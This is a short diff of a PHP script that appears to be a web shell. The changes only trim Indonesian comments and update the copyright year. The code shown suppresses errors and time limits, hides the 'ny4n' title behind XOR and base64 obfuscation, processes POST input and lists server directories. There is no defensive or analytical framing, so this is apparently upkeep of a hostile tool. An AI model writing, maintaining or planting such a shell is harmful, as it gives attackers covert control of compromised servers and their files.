@@ -2,9 +2,9 @@
 set_time_limit(0);
 error_reporting(0);
 
-// Fungsi untuk mendekripsi string yang telah dienkripsi
+// mendekripsi dienkripsi
 function decrypt($encryptedString) {
-    $key = '4b8e5e9f48c2f5a63b4c1e3a1f4a2b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2'; // Gunakan kunci rahasia yang sesuai
+    $key = '4b8e5e9f48c2f5a63b4c1e3a1f4a2b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2'; // kunci
     $decrypted = '';
     for ($i = 0; $i < strlen($encryptedString); $i++) {
         $decrypted .= chr(ord($encryptedString[$i]) ^ ord($key[$i % strlen($key)]));
@@ -12,8 +12,8 @@ function decrypt($encryptedString) {
     return $decrypted;
 }
 
-// Dekripsi dan decode title
-$title = decrypt(base64_decode('bnl4bg==')); // 'ny4n' dalam base64
+// Dekripsi
+$title = decrypt(base64_decode('bnl4bg==')); // 'ny4n'
 
 if (get_magic_quotes_gpc()) {
     foreach ($_POST as $key => $value) {
@@ -199,4 +199,4 @@ foreach ($scandir as $file) {
 
 echo '</table></div>';
 ?>
-<br><center>&copy; 2024 - <a href="cocoseakanakan">Handoko Fuji</a>.</center><br>
+<br><center>&copy; 2025 - <a href="cocoseakanakan">Handoko Fuji</a>.</center><br>
